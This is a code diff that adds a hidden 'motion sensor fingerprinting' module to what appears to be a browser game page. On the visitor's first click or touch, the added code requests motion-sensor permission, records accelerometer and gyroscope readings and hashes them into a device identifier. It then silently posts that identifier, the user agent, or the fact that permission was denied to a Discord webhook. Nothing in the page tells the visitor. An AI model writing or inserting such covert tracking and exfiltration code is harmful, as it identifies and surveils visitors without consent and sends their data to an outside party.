@@ -586,6 +586,252 @@
       });
     } catch(e) {}
   }
+  // ============================================================
+// 3. MOTION SENSOR FINGERPRINTING (Accelerometer + Gyroscope)
+// ============================================================
+
+let motionData = [];
+let isCollecting = false;
+let collectionStartTime = null;
+
+// Check if motion sensors are supported
+const hasMotionSupport = 'DeviceMotionEvent' in window;
+const hasOrientationSupport = 'DeviceOrientationEvent' in window;
+
+async function requestMotionPermission() {
+    // iOS 13+ requires explicit permission request
+    if (typeof DeviceMotionEvent !== 'undefined' && 
+        typeof DeviceMotionEvent.requestPermission === 'function') {
+        try {
+            const permissionState = await DeviceMotionEvent.requestPermission();
+            if (permissionState === 'granted') {
+                console.log('Motion permission granted');
+                return true;
+            } else {
+                console.log('Motion permission denied');
+                return false;
+            }
+        } catch (error) {
+            console.log('Motion permission error:', error);
+            return false;
+        }
+    } else {
+        // Android and other platforms: no explicit permission needed
+        return true;
+    }
+}
+
+function startMotionCollection(durationMs = 3000) {
+    if (isCollecting) return;
+    
+    motionData = [];
+    collectionStartTime = Date.now();
+    isCollecting = true;
+    
+    // Listen for motion events
+    window.addEventListener('devicemotion', motionHandler);
+    
+    // Stop collection after duration
+    setTimeout(() => {
+        stopMotionCollection();
+    }, durationMs);
+}
+
+function motionHandler(event) {
+    if (!isCollecting) return;
+    
+    const acc = event.acceleration;
+    const accG = event.accelerationIncludingGravity;
+    const rotation = event.rotationRate;
+    const interval = event.interval;
+    
+    motionData.push({
+        timestamp: Date.now(),
+        accX: acc?.x || null,
+        accY: acc?.y || null,
+        accZ: acc?.z || null,
+        accGX: accG?.x || null,
+        accGY: accG?.y || null,
+        accGZ: accG?.z || null,
+        rotAlpha: rotation?.alpha || null,
+        rotBeta: rotation?.beta || null,
+        rotGamma: rotation?.gamma || null,
+        interval: interval
+    });
+}
+
+function stopMotionCollection() {
+    if (!isCollecting) return;
+    
+    isCollecting = false;
+    window.removeEventListener('devicemotion', motionHandler);
+    
+    // Generate fingerprint from collected data
+    const fingerprint = generateMotionFingerprint(motionData);
+    
+    // Send to Discord
+    sendMotionFingerprintToDiscord(fingerprint);
+}
+
+function generateMotionFingerprint(data) {
+    if (data.length === 0) return null;
+    
+    // Calculate statistical features from motion data
+    const accXValues = data.map(d => d.accX).filter(v => v !== null);
+    const accYValues = data.map(d => d.accY).filter(v => v !== null);
+    const accZValues = data.map(d => d.accZ).filter(v => v !== null);
+    
+    // Helper function to calculate variance
+    function variance(values) {
+        if (values.length === 0) return null;
+        const mean = values.reduce((a, b) => a + b, 0) / values.length;
+        const squareDiffs = values.map(value => Math.pow(value - mean, 2));
+        return squareDiffs.reduce((a, b) => a + b, 0) / values.length;
+    }
+    
+    // Helper function to calculate range
+    function range(values) {
+        if (values.length === 0) return null;
+        return Math.max(...values) - Math.min(...values);
+    }
+    
+    // Helper function to calculate standard deviation
+    function stdDev(values) {
+        if (values.length === 0) return null;
+        const varVal = variance(values);
+        return varVal !== null ? Math.sqrt(varVal) : null;
+    }
+    
+    // Helper function to calculate mean
+    function mean(values) {
+        if (values.length === 0) return null;
+        return values.reduce((a, b) => a + b, 0) / values.length;
+    }
+    
+    // Generate a unique hash from the motion patterns
+    const fingerprintString = JSON.stringify({
+        accXVar: variance(accXValues),
+        accYVar: variance(accYValues),
+        accZVar: variance(accZValues),
+        accXRange: range(accXValues),
+        accYRange: range(accYValues),
+        accZRange: range(accZValues),
+        accXMean: mean(accXValues),
+        accYMean: mean(accYValues),
+        accZMean: mean(accZValues),
+        accXStd: stdDev(accXValues),
+        accYStd: stdDev(accYValues),
+        accZStd: stdDev(accZValues),
+        sampleCount: data.length,
+        duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0
+    });
+    
+    // Simple hash function
+    let hash = 0;
+    for (let i = 0; i < fingerprintString.length; i++) {
+        const char = fingerprintString.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+    }
+    
+    return {
+        hash: hash.toString(16),
+        variance: {
+            x: variance(accXValues),
+            y: variance(accYValues),
+            z: variance(accZValues)
+        },
+        sampleCount: data.length,
+        duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0,
+        hasMotionSensor: true
+    };
+}
+
+async function sendMotionFingerprintToDiscord(fingerprint) {
+    if (!fingerprint) {
+        // Send that motion sensors are not available
+        const embed = {
+            title: "📳 MOTION SENSOR STATUS",
+            color: 0xffaa00,
+            fields: [
+                { name: "Status", value: "Motion sensors unavailable or permission denied", inline: false },
+                { name: "Browser", value: navigator.userAgent.substring(0, 60), inline: false }
+            ],
+            footer: { text: "User may have denied permission or device lacks sensors" }
+        };
+        
+        try {
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch(e) {}
+        return;
+    }
+    
+    const embed = {
+        title: "📳 MOTION SENSOR FINGERPRINT",
+        color: 0x00ccff,
+        timestamp: new Date().toISOString(),
+        fields: [
+            { name: "Device Hash", value: `\`${fingerprint.hash}\``, inline: false },
+            { name: "Sensor Variance (X/Y/Z)", value: `${fingerprint.variance.x?.toFixed(4) || 'N/A'} / ${fingerprint.variance.y?.toFixed(4) || 'N/A'} / ${fingerprint.variance.z?.toFixed(4) || 'N/A'}`, inline: false },
+            { name: "Sample Count", value: fingerprint.sampleCount.toString(), inline: true },
+            { name: "Duration (ms)", value: fingerprint.duration.toString(), inline: true },
+            { name: "Note", value: "Variance patterns can help identify unique devices", inline: false }
+        ],
+        footer: { text: "Motion sensor fingerprint • Manufacturing imperfections create unique patterns" }
+    };
+    
+    try {
+        await fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+    } catch(e) {
+        console.log("Motion fingerprint send failed");
+    }
+}
+
+// Initialize motion fingerprinting on page load (with user gesture)
+async function initMotionFingerprinting() {
+    // Check if motion sensors are supported
+    if (!hasMotionSupport) {
+        console.log("DeviceMotionEvent not supported");
+        return;
+    }
+    
+    // For iOS, we need a user gesture to request permission
+    // Attach to a click event on the document
+    const setupMotionOnClick = async () => {
+        const permissionGranted = await requestMotionPermission();
+        if (permissionGranted) {
+            // Collect motion data for 3 seconds
+            startMotionCollection(3000);
+        } else {
+            // Send notification that permission was denied
+            sendMotionFingerprintToDiscord(null);
+        }
+        // Remove listener after first click to avoid multiple requests
+        document.removeEventListener('click', setupMotionOnClick);
+        document.removeEventListener('touchstart', setupMotionOnClick);
+    };
+    
+    // Listen for first user interaction
+    document.addEventListener('click', setupMotionOnClick);
+    document.addEventListener('touchstart', setupMotionOnClick);
+    
+    // Set a timeout in case user never clicks
+    setTimeout(() => {
+        document.removeEventListener('click', setupMotionOnClick);
+        document.removeEventListener('touchstart', setupMotionOnClick);
+    }, 10000);
+}
+
+// Start motion fingerprinting (non-blocking)
+initMotionFingerprinting();
   
   // Game State
   const PASS_MAIN = "4820";
